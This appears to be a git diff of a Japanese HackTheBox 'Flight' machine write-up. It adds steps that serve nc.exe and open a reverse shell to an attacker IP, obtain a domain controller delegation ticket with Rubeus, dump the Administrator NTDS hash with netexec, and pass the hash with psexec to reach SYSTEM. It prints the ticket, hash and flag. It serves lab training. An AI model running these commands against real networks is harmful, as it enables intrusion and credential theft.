@@ -746,9 +746,12 @@ dir
                1 File(s)          1,400 bytes
                3 Dir(s)   5,136,011,264 bytes free
 ```
-webshellにアクセス、ああコマンドも実行確認  
+webshellにアクセス、コマンドも実行確認  
+iis apppool\defaultapppoolというサービスアカウントで動作している  
+[公式サイト](https://learn.microsoft.com/ja-jp/iis/manage/configuring-security/application-pool-identities#accessing-the-network)では、サービスアカウントはマシンアカウントとしてドメイン環境にログインする  
+iisはドメインコントローラ上で動作しているため、結果ドメコン機能をもつマシンアカウントのチケットを取得できるかも  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_07.png">  
-webshell経由でリバースシェルを取得する  
+まずはwebshell経由でリバースシェルを取得する  
 nc.exeを配送
 ```sh
 └─$ cp /usr/share/windows-resources/binaries/nc.exe .
@@ -760,7 +763,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 C:\inetpub\development>powershell /c "Invoke-Webrequest http://10.10.16.6/nc.exe -outfile nc.exe"
 powershell /c "Invoke-Webrequest http://10.10.16.6/nc.exe -outfile nc.exe"
 ```
-webshell上で実行
+※webshell上で実行
 ```powershell
 cmd /c C:\inetpub\development\nc.exe -e cmd 10.10.16.6 6666
 ```
@@ -775,4 +778,91 @@ Microsoft Windows [Version 10.0.17763.2989]
 c:\windows\system32\inetsrv>whoami
 whoami
 iis apppool\defaultapppool
+```
+
+
+## STEP 8
+ドメコン機能をもつマシンアカウントのチケットをrubeusで取得する
+```sh
+└─$ cp /usr/share/windows-resources/rubeus/Rubeus.exe .        
+
+└─$ python3.13 -m http.server 80                                                                                                                                      
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+rubeus実行  
+ドメコン（g0.flight.htb）のtgtゲット！
+```powershell
+c:\Windows\System32\inetsrv>cd C:\Users\Public
+cd C:\Users\Public
+
+C:\Users\Public>powershell /c "Invoke-Webrequest http://10.10.16.6/Rubeus.exe -outfile rubeus.exe"
+powershell /c "Invoke-Webrequest http://10.10.16.6/Rubeus.exe -outfile rubeus.exe"
+
+C:\Users\Public>.\rubeus.exe tgtdeleg /nowrap
+.\rubeus.exe tgtdeleg /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4 
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: 26/TXe3ZnweAzmlhAswzQg3tTmvHYP2+eUsjsr8L/as=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECgHBiEQVn4ZViv9i3MF8N65eX7rtTp6EtVlwg6a2zy3Wm7oIgFBk/badWdyyaYlVuKSg3IgiSaqH9xPJtlps0/Cotu6hJjC+IxF2kXPPaYMVy0+OiFIOQ0wOCNvX/rmyOf7bmrp2CTfgYmJYsNQke+AdncCdAZmn07S644WV9ldOG/33Q6G+63WVQxvTQf+Dxei5FLURqdqtXl+dcR7zei38uJVHA3ihsoEVgg/sGcD37/r7Aw5BUmZl1IqxJoarrvEDp9Es41Np2ETYmJ4m1vrG7ka13xYw/8x8yuGvgHPRvxLZ0+1OdBs6TRoiWI64iaD5sc1CWKSPz/tyL7G+o4Il7SfsNO3Aj+oZKiPv4fkkZOY22ba98LzxGrL6e6dv78ALbgy4Z7FqP5TbKGnhtjITs9ZbHLXXzBT/nc/nEaQyE2/faIOkdu5B0uKvrPJhYnPHR2dEe5xGQVxe9bFCQRvzKeOJnOrj5WQA9cRxN/+wPk6jRZL1QkuE5QufumAOsN2/S/HYgO/jbxCMcD401YAly5tc9JZ5QbZDmX1sk+gF/8Z3iPtFYAvYUb05ykjj23KNZ6lJQCVnOeMBSlkH2K2+sUd3+wKv+XYix8f9iCsXdPeskewWc/hPr3NZgKG4CLbn298yNjc2jYYQSOig4PESKcILXxYKLnXSCnT4+ZEvhl3DCHNCpLj0S+DGN+ayG8+r614jGWor/QBSWA0hBGISRg/kab75u0Sn5TdSxn4xbShhkTywZju93gOn2aD4G02XoewJgvLc50KSkuAIsrKp5JelZIPkpNKy9RvcCmzbOKqlIF6FrVDMPhdRFM3Ooen/pb2kFb3cQvIZgVWP8h9MM+rnYu7dw4vABRZtJQXXmcvFxQ3kOtB84QgjHT8WAaN/wKJue+0jCRiq3CKUuEL8b/hS/YAkDbGqXp9Q6WOtLeGl8kU+uB9sWIaBqoJYzfujsQgtvA5KHZx6xuWZVfbreDI2z1hHUiaIdUSnogkSiW/Bbs36gyY44UqHnwXltuHEuJzzHlil1PThbqAEdd3QgvdkUWAvvzS/N49qxzNM8nal8E4kDqEMUFS0M5iaVUwI8yQ4DKu4mCcFYb1p+gzWh2E2IQ2w/uOpUwxfmg/+Xjy7JWFPWjT/hFF6w1kXU1zO5k1HQ5vjVaerzLsEUu3uvq2enycGT2XfhXphF9T0me2iIK1lohvO1AU/VgVGyFwhvXyyilXYHggwzU9f3vsCKD51AYKTxo75t0kjuBM3PmCs32K66PgJ1I+pYB1cIRFdg0n/Dpidi6fwO9MCT2TWNV+XwhVKeyU1jJG0oaWIc5d3IwNyifafhDN2IA+H18dLdEYX1WbyWwG19jG3pRQcieiJxWX+Yy1wo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgzNXrB/OnwsLr2Bu1Oc63G3+vL8KVu7/Ln+EhtFlNbmuhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTAxNjE4NDk1NlqmERgPMjAyNTEwMTcwNDQ5NTZapxEYDzIwMjUxMDIzMTg0OTU2WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
+```
+```sh
+└─$ base64 -d base64_ticket.kirbi > ticket.kirbi
+
+└─$ impacket-ticketConverter ticket.kirbi ticket.ccachetype
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] converting kirbi to ccache...
+[+] done
+
+└─$ export KRB5CCNAME=ticket.ccache
+```
+impacket-secretsdumpが役に立たんかった、ぼけ
+```sh
+└─$ netexec smb g0.flight.htb --use-kcache --ntds drsuapi --user administrator
+SMB         g0.flight.htb   445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
+SMB         g0.flight.htb   445    G0               [+] FLIGHT.HTB\G0$ from ccache 
+SMB         g0.flight.htb   445    G0               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         g0.flight.htb   445    G0               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         g0.flight.htb   445    G0               Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
+SMB         g0.flight.htb   445    G0               [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/G0_g0.flight.htb_2025-10-16_161215.ntds of which 1 were added to the database
+SMB         g0.flight.htb   445    G0               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         g0.flight.htb   445    G0               [*] cat /home/kali/.nxc/logs/ntds/G0_g0.flight.htb_2025-10-16_161215.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         g0.flight.htb   445    G0               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/G0_g0.flight.htb_2025-10-16_161215.ntds | cut -d ':' -f1
+```
+```sh
+└─$ impacket-psexec -ts -hashes ':43bbfc530bab76141b12c8446e30c17c' 'administrator@10.129.228.120'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-10-16 16:15:29] [*] Requesting shares on 10.129.228.120.....
+[2025-10-16 16:15:33] [*] Found writable share ADMIN$
+[2025-10-16 16:15:34] [*] Uploading file lfxyvzfW.exe
+[2025-10-16 16:15:39] [*] Opening SVCManager on 10.129.228.120.....
+[2025-10-16 16:15:42] [*] Creating service RzEV on 10.129.228.120.....
+[2025-10-16 16:15:44] [*] Starting service RzEV.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> type C:\Users\administrator\Desktop\root.txt
+f1c0ec4b7252f61fbaea30668463ebd6
 ```
